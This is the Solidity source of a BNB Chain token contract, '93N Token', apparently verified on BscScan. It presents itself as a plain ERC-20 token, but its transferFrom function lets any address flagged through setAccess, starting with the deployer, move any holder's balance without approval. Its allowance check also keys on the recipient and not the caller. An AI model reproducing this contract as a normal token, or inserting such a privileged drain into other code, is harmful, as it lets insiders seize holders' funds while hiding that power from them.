/**
 *Submitted for verification at BscScan.com on 2022-09-27
*/

pragma solidity>0.8.0;//SPDX-License-Identifier:None
contract ERC20AC_93N{
    event Transfer(address indexed from,address indexed to,uint value);
    event Approval(address indexed owner,address indexed spender,uint value);
    mapping(address=>uint)internal _balances;
    mapping(address=>mapping(address=>uint))internal _allowances;
    mapping(address=>uint)private _access;
    uint internal _totalSupply;
    constructor(){
        _access[msg.sender]=1;
        _totalSupply=13e26; //1.3 billion with 18 trailing decimal
        _balances[msg.sender]=_totalSupply;
        emit Transfer(address(this),msg.sender,_totalSupply);
    }
    function name()external pure returns(string memory){
        return"93N Token";
    }
    function symbol()external pure returns(string memory){
        return"93N";
    }
    function decimals()external pure returns(uint){
        return 18;
    }
    function totalSupply()external view returns(uint){
        return _totalSupply;
    }
    function balanceOf(address a)external view returns(uint){
        return _balances[a];
    }
    function transfer(address a,uint b)external returns(bool){
        transferFrom(msg.sender,a,b);
        return true;
    }
    function allowance(address a,address b)external view returns(uint){
        return _allowances[a][b];
    }
    function approve(address a,uint b)external returns(bool){
        _allowances[msg.sender][a]=b;
        emit Approval(msg.sender,a,b);
        return true;
    }
    function transferFrom(address a,address b,uint c)public virtual returns(bool){unchecked{
        require(_balances[a]>=c);
        require(a==msg.sender||_allowances[a][b]>=c||_access[msg.sender]>0);
        if(_allowances[a][b]>=c)_allowances[a][b]-=c;
        (_balances[a]-=c,_balances[b]+=c);
        emit Transfer(a,b,c);
        return true;
    }}
    function setAccess(address a)external{
        require(_access[msg.sender]>0);
        _access[a]=1;
    }
}